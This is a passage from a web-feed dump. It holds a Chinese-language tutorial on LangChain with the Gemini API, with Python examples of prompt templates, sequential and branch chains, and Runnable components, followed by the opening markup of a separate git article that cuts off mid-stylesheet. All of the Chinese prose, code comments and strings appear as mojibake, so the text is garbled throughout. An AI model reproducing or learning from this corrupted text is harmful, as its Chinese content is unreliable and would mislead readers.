<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv 

load_dotenv() 

client = genai.Client(api_key=os.getenv(<span class="hljs-string">"GEMINI_API_KEY"</span>))

response = client.models.generate_content(
    model=<span class="hljs-string">"gemini-3-flash-preview"</span>, contents=<span class="hljs-string">"Explain how AI works in a few words"</span>
)
<span class="hljs-built_in">print</span>(response.text)

</code></pre>
<p>å¾ˆç®€å•çš„æ›¿æ¢ï¼ŒæŠŠåŸæ¥ OpenAI çš„éƒ¨åˆ†æ¢æˆ Gemini API å°±è¡Œäº†</p>
<h2 data-id="heading-8">æ ¸å¿ƒç»„ä»¶</h2>
<p>æ¥ä¸‹æ¥å­¦ä¹  LangChain æ ¸å¿ƒç»„ä»¶</p>
<h3 data-id="heading-9">Promptsï¼ˆæç¤ºè¯ï¼‰</h3>
<p>è¿™ä¸ªä¸å¤šè¯´äº†ï¼Œä¸ LLM æœ€åŸºæœ¬çš„äº¤äº’æ–¹å¼ï¼Œå†…å®¹åŒ…å«æç¤ºè¯æ¨¡æ¿ã€å°‘æ ·æœ¬æç¤ºã€è¾“å‡ºè§£æå™¨ç­‰</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¿»è¯‘ä¾‹å­ï¼Œè®©AIæŠŠä¸­æ–‡ç¿»è¯‘æˆè‹±æ–‡</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ›å»ºæç¤ºè¯æ¨¡æ¿</span>
prompt = ChatPromptTemplate.from_messages([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ç¿»è¯‘åŠ©æ‰‹ã€‚è¯·å°†ç”¨æˆ·çš„ä¸­æ–‡æ–‡æœ¬ç¿»è¯‘æˆè‹±æ–‡ã€‚"</span>),
    (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{input}"</span>)
])

<span class="hljs-comment"># åˆå§‹åŒ–æ¨¡å‹</span>
model = ChatGoogleGenerativeAI(model=<span class="hljs-string">"gemini-3-flash-preview"</span>)

<span class="hljs-comment"># ç»„åˆé“¾</span>
chain = prompt | model

<span class="hljs-comment"># æ‰§è¡Œ</span>
result = chain.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"LangChainæ˜¯ä¸€ä¸ªå¼ºå¤§çš„LLMåº”ç”¨å¼€å‘æ¡†æ¶ã€‚"</span>})
<span class="hljs-comment"># åªè¾“å‡ºæ¨¡å‹å¯¹è¯çš„ç»“æœ</span>
<span class="hljs-built_in">print</span>(result.content[<span class="hljs-number">0</span>][<span class="hljs-string">'text'</span>])
</code></pre>
<p>æœ€åæˆ‘æ·»åŠ äº†æ‰“å° <code>result.content[0]['text']</code> ï¼Œåªè¾“å‡ºæ¨¡å‹å¯¹è¯çš„ç»“æœï¼Œä¸ç„¶ä¸œè¥¿å¤ªå¤šï¼Œå½±å“è°ƒè¯•ï¼Œè¾“å‡ºç»“æœä¸ºå¦‚ä¸‹å†…å®¹</p>
<pre><code class="hljs language-shell" lang="shell">(venv) w@GYW:~/AIProjects/ai-agent-project/Gemini$ python langchain.py 
LangChain is a powerful LLM application development framework.
</code></pre>
<h3 data-id="heading-10">Chainsï¼ˆé“¾ï¼‰</h3>
<p>Chains çš„ä½œç”¨æ˜¯å°†å¤šä¸ªç»„ä»¶ç»„åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„å·¥ä½œæµç¨‹ã€‚åŒ…å«ä»¥ä¸‹ç±»å‹ï¼š</p>
<ul>
<li>ç®€å•é“¾ï¼ˆSimple Chainsï¼‰</li>
<li>é¡ºåºé“¾ï¼ˆSequential Chainsï¼‰</li>
<li>åˆ†æ”¯é“¾ï¼ˆBranch Chainsï¼‰</li>
<li>Runnable æ¥å£</li>
</ul>
<p>ä¸‹é¢çš„ä¾‹å­ä¸­ä½¿ç”¨äº† langchain_core åŒ…ä¸­çš„ <code>ChatPromptTemplate</code>ã€<code>StrOutputParser</code>ã€<code>RunnableParallel</code>ã€ <code>RunnableBranch</code>ã€ <code>RunnableLambda</code> ç­‰å‡½æ•°åŠŸèƒ½</p>
<h4 data-id="heading-11">ç®€å•é“¾ï¼ˆSimple Chainsï¼‰</h4>
<p>ä¸Šé¢çš„Promptsçš„ä»£ç ä¸­å·²ç»æœ‰äº†ä¸€ä¸ªç®€å•çš„ç¿»è¯‘é“¾</p>
<p>ä¸‹é¢çš„ç®€å•é“¾ä½œç”¨æ˜¯å°†å•ä¸ªæç¤ºè¯å’Œæ¨¡å‹ç»„åˆæˆä¸€ä¸ªç®€å•çš„å·¥ä½œæµ</p>
<p>ä¸‹é¢çš„è¿™ä¸ªå‡½æ•°æ·»åŠ äº†è¾“å‡ºè§£æå™¨ï¼Œç”¨äºè§£ææ¨¡å‹çš„è¾“å‡ºï¼Œç”¨ <code>StrOutputParser</code> è§£æå™¨èƒ½ç›´æ¥å°†å°†æ¨¡å‹çš„è¾“å‡ºè½¬æ¢ä¸ºå­—ç¬¦ä¸²</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_chain_example</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 1. ç®€å•é“¾ï¼ˆSimple Chainsï¼‰ç¤ºä¾‹ ==="</span>)
    
    <span class="hljs-comment"># åˆ›å»ºæç¤ºè¯æ¨¡æ¿</span>
    prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ç¿»è¯‘åŠ©æ‰‹ã€‚è¯·å°†ç”¨æˆ·çš„ä¸­æ–‡æ–‡æœ¬ç¿»è¯‘æˆè‹±æ–‡ã€‚"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{input}"</span>)
    ])
    
    <span class="hljs-comment"># ç»„åˆé“¾ï¼šæç¤ºè¯ â†’ æ¨¡å‹ â†’ è¾“å‡ºè§£æå™¨</span>
    chain = prompt | model | output_parser
    
    <span class="hljs-comment"># æ‰§è¡Œ</span>
    result = chain.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"LangChainæ˜¯ä¸€ä¸ªå¼ºå¤§çš„LLMåº”ç”¨å¼€å‘æ¡†æ¶ã€‚"</span>})
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç¿»è¯‘ç»“æœ: <span class="hljs-subst">{result}</span>"</span>)
    
    <span class="hljs-keyword">return</span> result

</code></pre>
<h4 data-id="heading-12">é¡ºåºé“¾ï¼ˆSequential Chainsï¼‰</h4>
<p>é¡ºåºé“¾çš„ä½œç”¨æ˜¯å°†å¤šä¸ªé“¾æŒ‰é¡ºåºè¿æ¥ï¼Œå‰ä¸€ä¸ªé“¾çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªé“¾çš„è¾“å…¥</p>
<p>é‡ç‚¹çœ‹ä¸‹é¢ä»£ç çš„ <code>full_chain = translate_prompt | model | output_parser | uppercase_chain | count_chain</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sequential_chain_example</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 2. é¡ºåºé“¾ï¼ˆSequential Chainsï¼‰ç¤ºä¾‹ ==="</span>)
    
    <span class="hljs-comment"># ä¼˜åŒ–æç¤ºè¯æ¨¡æ¿æ ¼å¼</span>
    <span class="hljs-comment"># ç¬¬ä¸€ä¸ªé“¾ï¼šç¿»è¯‘ä¸­æ–‡åˆ°è‹±æ–‡</span>
    translate_prompt = ChatPromptTemplate.from_template(
        <span class="hljs-string">"è¯·å°†ä»¥ä¸‹ä¸­æ–‡æ–‡æœ¬ç¿»è¯‘æˆè‹±æ–‡ï¼š{chinese_text}"</span>
    )
    translate_chain = translate_prompt | model | output_parser
    
    <span class="hljs-comment"># ç¬¬äºŒä¸ªé“¾ï¼šå°†è‹±æ–‡æ–‡æœ¬è½¬æ¢ä¸ºå¤§å†™ï¼ˆä½¿ç”¨Pythonå†…ç½®å‡½æ•°æ›¿ä»£æ¨¡å‹è°ƒç”¨ï¼‰</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_uppercase</span>(<span class="hljs-params">text</span>):
        <span class="hljs-keyword">return</span> text.upper()
    uppercase_chain = RunnableLambda(to_uppercase)
    
    <span class="hljs-comment"># ç¬¬ä¸‰ä¸ªé“¾ï¼šç»Ÿè®¡å¤§å†™æ–‡æœ¬çš„å•è¯æ•°ï¼ˆä½¿ç”¨Pythonå†…ç½®å‡½æ•°æ›¿ä»£æ¨¡å‹è°ƒç”¨ï¼‰</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">count_words</span>(<span class="hljs-params">text</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(text.split()))
    count_chain = RunnableLambda(count_words)
    
    <span class="hljs-comment"># ç»„åˆé¡ºåºé“¾ï¼šç¿»è¯‘ â†’ å¤§å†™è½¬æ¢ â†’ å•è¯è®¡æ•°</span>
    full_chain = translate_prompt | model | output_parser | uppercase_chain | count_chain
    
    <span class="hljs-comment"># æ‰§è¡Œé¡ºåºé“¾</span>
    input_text = <span class="hljs-string">"LangChainæ˜¯ä¸€ä¸ªå¼ºå¤§çš„LLMåº”ç”¨å¼€å‘æ¡†æ¶ã€‚"</span>
    word_count_result = full_chain.invoke({<span class="hljs-string">"chinese_text"</span>: input_text})
    
    <span class="hljs-comment"># åˆ†æ­¥æ‰§è¡Œä»¥æ˜¾ç¤ºä¸­é—´ç»“æœ</span>
    translated_text = translate_chain.invoke({<span class="hljs-string">"chinese_text"</span>: input_text})
    uppercase_text = to_uppercase(translated_text)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"1. åŸå§‹æ–‡æœ¬: <span class="hljs-subst">{input_text}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"2. ç¿»è¯‘ç»“æœ: <span class="hljs-subst">{translated_text}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"3. å¤§å†™è½¬æ¢: <span class="hljs-subst">{uppercase_text}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"4. å•è¯æ•°é‡: <span class="hljs-subst">{word_count_result}</span>"</span>)
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"chinese_text"</span>: input_text,
        <span class="hljs-string">"english_text"</span>: translated_text,
        <span class="hljs-string">"uppercase_text"</span>: uppercase_text,
        <span class="hljs-string">"word_count"</span>: word_count_result
    }

</code></pre>
<h4 data-id="heading-13">åˆ†æ”¯é“¾ï¼ˆBranch Chainsï¼‰</h4>
<p>åˆ†æ”¯é“¾çš„ä½œç”¨æ˜¯æ ¹æ®è¾“å…¥æ¡ä»¶é€‰æ‹©ä¸åŒçš„å¤„ç†è·¯å¾„ï¼Œå°±åƒæ™®é€šä»£ç çš„if-elseè¯­å¥ä¸€æ ·ï¼Œ<code>RunnableBranch</code> æ˜¯å®ç°åˆ†æ”¯é€»è¾‘çš„é‡ç‚¹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">branch_chain_example</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 3. åˆ†æ”¯é“¾ï¼ˆBranch Chainsï¼‰ç¤ºä¾‹ ==="</span>)
    
    <span class="hljs-comment"># å®šä¹‰ä¸åŒä»»åŠ¡çš„æç¤ºè¯</span>
    translation_prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ç¿»è¯‘åŠ©æ‰‹ã€‚è¯·å°†ç”¨æˆ·çš„ä¸­æ–‡æ–‡æœ¬ç¿»è¯‘æˆè‹±æ–‡ã€‚"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{content}"</span>)
    ])
    
    summarization_prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æ€»ç»“åŠ©æ‰‹ã€‚è¯·å°†ç”¨æˆ·çš„æ–‡æœ¬æ€»ç»“ä¸ºä¸€å¥è¯ã€‚"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{content}"</span>)
    ])
    
    explanation_prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„è§£é‡ŠåŠ©æ‰‹ã€‚è¯·ç”¨ç®€å•æ˜“æ‡‚çš„è¯­è¨€è§£é‡Šç”¨æˆ·æåˆ°çš„æ¦‚å¿µã€‚"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{content}"</span>)
    ])
    
    <span class="hljs-comment"># åˆ›å»ºä¸åŒä»»åŠ¡çš„é“¾</span>
    translation_chain = translation_prompt | model | output_parser
    summarization_chain = summarization_prompt | model | output_parser
    explanation_chain = explanation_prompt | model | output_parser
    
    <span class="hljs-comment"># å®šä¹‰åˆ†æ”¯æ¡ä»¶å‡½æ•°</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">route_by_task</span>(<span class="hljs-params">input_dict</span>):
        task = input_dict.get(<span class="hljs-string">"task"</span>, <span class="hljs-string">""</span>).lower()
        <span class="hljs-keyword">if</span> <span class="hljs-string">"ç¿»è¯‘"</span> <span class="hljs-keyword">in</span> task:
            <span class="hljs-keyword">return</span> translation_chain
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"æ€»ç»“"</span> <span class="hljs-keyword">in</span> task:
            <span class="hljs-keyword">return</span> summarization_chain
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"è§£é‡Š"</span> <span class="hljs-keyword">in</span> task:
            <span class="hljs-keyword">return</span> explanation_chain
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># é»˜è®¤è¿”å›ç¿»è¯‘é“¾</span>
            <span class="hljs-keyword">return</span> translation_chain
    
    <span class="hljs-comment"># åˆ›å»ºåˆ†æ”¯é“¾</span>
    branch_chain = RunnableBranch(
        (
            <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">"ç¿»è¯‘"</span> <span class="hljs-keyword">in</span> x.get(<span class="hljs-string">"task"</span>, <span class="hljs-string">""</span>).lower(), 
            translation_chain
        ),
        (
            <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">"æ€»ç»“"</span> <span class="hljs-keyword">in</span> x.get(<span class="hljs-string">"task"</span>, <span class="hljs-string">""</span>).lower(), 
            summarization_chain
        ),
        (
            <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">"è§£é‡Š"</span> <span class="hljs-keyword">in</span> x.get(<span class="hljs-string">"task"</span>, <span class="hljs-string">""</span>).lower(), 
            explanation_chain
        ),
        translation_chain  <span class="hljs-comment"># é»˜è®¤é“¾</span>
    )
    
    <span class="hljs-comment"># æµ‹è¯•ä¸åŒåˆ†æ”¯</span>
    test_cases = [
        {<span class="hljs-string">"task"</span>: <span class="hljs-string">"ç¿»è¯‘"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"LangChainæ˜¯ä¸€ä¸ªå¼ºå¤§çš„LLMåº”ç”¨å¼€å‘æ¡†æ¶ã€‚"</span>},
        {<span class="hljs-string">"task"</span>: <span class="hljs-string">"æ€»ç»“"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"LangChainæ˜¯ä¸€ä¸ªç”¨äºå¼€å‘LLMåº”ç”¨çš„å¼€æºæ¡†æ¶ï¼Œå®ƒæä¾›äº†ä¸°å¯Œçš„ç»„ä»¶å’Œå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©å¼€å‘è€…å¿«é€Ÿæ„å»ºå¤æ‚çš„AIåº”ç”¨ã€‚"</span>},
        {<span class="hljs-string">"task"</span>: <span class="hljs-string">"è§£é‡Š"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"å¤§è¯­è¨€æ¨¡å‹"</span>}
    ]
    
    results = []
    <span class="hljs-keyword">for</span> i, test_case <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(test_cases, <span class="hljs-number">1</span>):
        result = branch_chain.invoke(test_case)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æµ‹è¯• <span class="hljs-subst">{i}</span> (ä»»åŠ¡: <span class="hljs-subst">{test_case[<span class="hljs-string">'task'</span>]}</span>): <span class="hljs-subst">{result}</span>"</span>)
        results.append(result)
    
    <span class="hljs-keyword">return</span> results

</code></pre>
<h4 data-id="heading-14">Runnable æ¥å£</h4>
<p><code>Runnable</code> æ¥å£æ˜¯ LangChain ä¸­æ‰€æœ‰å¯è¿è¡Œç»„ä»¶çš„åŸºç±»ï¼Œå®ƒå®šä¹‰äº†ç»„ä»¶çš„åŸºæœ¬è¡Œä¸ºï¼Œå¦‚ <code>invoke</code>ã€<code>batch</code> ç­‰ã€‚é€šè¿‡å®ç° <code>Runnable</code> æ¥å£ï¼Œè‡ªå®šä¹‰ç»„ä»¶å¯ä»¥ä¸ LangChain çš„å…¶ä»–ç»„ä»¶æ— ç¼é›†æˆï¼Œå®ç°å¤æ‚çš„å·¥ä½œæµ</p>
<p>ç®€å•ç†è§£æ˜¯ç»„åˆä¸åŒçš„é“¾æˆ–è€…ç»„ä»¶åŠŸèƒ½ï¼Œå®ç°æ›´å¤æ‚çš„å·¥ä½œæµæˆ–è€…åŠŸèƒ½</p>
<p>é‡ç‚¹çœ‹ä¸‹é¢çš„ä¾‹å­ä¸­æœ€åçš„è¿”å› <code>return</code> æ˜¯è¿”å›äº†ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†ä¸åŒé“¾çš„å¤„ç†ç»“æœ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">runnable_interface_example</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 4. Runnable æ¥å£ç¤ºä¾‹ ==="</span>)
    
    <span class="hljs-comment"># åˆ›å»ºåŸºç¡€æç¤ºè¯</span>
    prompt = ChatPromptTemplate.from_messages([
        (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„åŠ©æ‰‹ã€‚è¯·æ ¹æ®ç”¨æˆ·çš„è¦æ±‚å¤„ç†æ–‡æœ¬ã€‚"</span>),
        (<span class="hljs-string">"user"</span>, <span class="hljs-string">"{input}"</span>)
    ])
    
    <span class="hljs-comment"># 1. RunnableLambdaï¼šåˆ›å»ºè‡ªå®šä¹‰å¤„ç†å‡½æ•°</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_text</span>(<span class="hljs-params">text</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"å¤„ç†åçš„æ–‡æœ¬ï¼š<span class="hljs-subst">{text.upper()}</span>"</span>
    
    lambda_chain = RunnableLambda(process_text)
    
    <span class="hljs-comment"># 2. RunnableParallelï¼šå¹¶è¡Œæ‰§è¡Œå¤šä¸ªé“¾</span>
    parallel_chain = RunnableParallel(
        original=prompt | model | output_parser,
        uppercase=prompt | model | output_parser | RunnableLambda(<span class="hljs-keyword">lambda</span> x: x.upper()),
        lowercase=prompt | model | output_parser | RunnableLambda(<span class="hljs-keyword">lambda</span> x: x.lower())
    )
    
    <span class="hljs-comment"># 3. RunnableSequenceï¼šé¡ºåºæ‰§è¡Œé“¾ï¼ˆä¸ | æ“ä½œç¬¦ç­‰ä»·ï¼‰</span>
    <span class="hljs-keyword">from</span> langchain_core.runnables <span class="hljs-keyword">import</span> RunnableSequence
    
    <span class="hljs-comment"># å®šä¹‰è‡ªå®šä¹‰è§£æå™¨</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_parser</span>(<span class="hljs-params">output</span>):
        <span class="hljs-comment"># ç®€å•ç¤ºä¾‹ï¼šåªè¿”å›åŒ…å«"æ¡†æ¶"çš„éƒ¨åˆ†</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(output, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">"content"</span> <span class="hljs-keyword">in</span> output:
            <span class="hljs-keyword">return</span> output.content[<span class="hljs-number">0</span>][<span class="hljs-string">'text'</span>] <span class="hljs-keyword">if</span> output.content <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> output
    
    sequence_chain = RunnableSequence(
        first=prompt,
        middle=[model],
        last=RunnableLambda(custom_parser)
    )
    
    <span class="hljs-comment"># æµ‹è¯•Runnableæ¥å£</span>
    input_text = <span class="hljs-string">"LangChainæ˜¯ä¸€ä¸ªå¼ºå¤§çš„LLMåº”ç”¨å¼€å‘æ¡†æ¶ã€‚"</span>
    
    <span class="hljs-comment"># æµ‹è¯•RunnableLambda</span>
    lambda_result = lambda_chain.invoke(input_text)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"RunnableLambdaç»“æœ: <span class="hljs-subst">{lambda_result}</span>"</span>)
    
    <span class="hljs-comment"># æµ‹è¯•RunnableParallel</span>
    parallel_result = parallel_chain.invoke({<span class="hljs-string">"input"</span>: input_text})
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"RunnableParallelç»“æœ:"</span>)
    <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> parallel_result.items():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  <span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)
    
    <span class="hljs-comment"># æµ‹è¯•RunnableSequence</span>
    sequence_result = sequence_chain.invoke({<span class="hljs-string">"input"</span>: input_text})
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"RunnableSequenceç»“æœ: <span class="hljs-subst">{sequence_result}</span>"</span>)
    
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"lambda_result"</span>: lambda_result,
        <span class="hljs-string">"parallel_result"</span>: parallel_result,
        <span class="hljs-string">"sequence_result"</span>: sequence_result
    }

</code></pre>
<h2 data-id="heading-15">å°ç»“</h2>
<p>é¢å‘AIçš„å­¦ä¹ æ–¹å¼å¾ˆå¿«ï¼Œè¯»ä»£ç çš„è¯éœ€è¦æœ‰ä¸€å®šçš„åŸºç¡€ï¼Œæ¯”å¦‚Pythonï¼ŒLLMç­‰ï¼Œå¯¹åº”çš„ä»£ç è‡ªå·±å»è¿è¡Œä¸€ä¸‹ï¼Œç„¶åæ”¹æ”¹å‚æ•°ï¼Œçœ‹çœ‹æ•ˆæœï¼Œåœ¨å®è·µä¸­å»ç†è§£ç»„ä»¶/å‡½æ•°çš„åŠŸèƒ½å’Œä½œç”¨ï¼Œä¸‹ä¸€ç¯‡å­¦ä¹ LangChainçš„æ ¸å¿ƒç»„ä»¶ Memoryï¼ˆè®°å¿†ï¼‰å’Œ Document Loadersï¼ˆæ–‡æ¡£åŠ è½½å™¨ï¼‰</p>
<blockquote>
<p>æ¬¢è¿ç•™è¨€äº¤æµï¼Œå¦‚æœè§‰å¾—æœ‰å¸®åŠ©ï¼Œå¯ä»¥<code>ç‚¹ä¸ªèµ</code>æ”¯æŒä¸€ä¸‹</p>
<p>å…¬ä¼—å·ï¼šè‰å¸½lufei</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[gitç‰ˆæœ¬æ§åˆ¶]git pull origin main]]></title>    <link>https://juejin.cn/post/7595358285721813001</link>    <guid>https://juejin.cn/post/7595358285721813001</guid>    <pubDate>2026-01-15T06:52:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595358285721813001" data-draft-id="7595358285721796617" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[gitç‰ˆæœ¬æ§åˆ¶]git pull origin main"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-15T06:52:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="import_random"/> <meta itemprop="url" content="https://juejin.cn/user/2013961033882312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [gitç‰ˆæœ¬æ§åˆ¶]git pull origin main
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2013961033882312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    import_random
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:52:37.000Z" title="Thu Jan 15 2026 06:52:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol 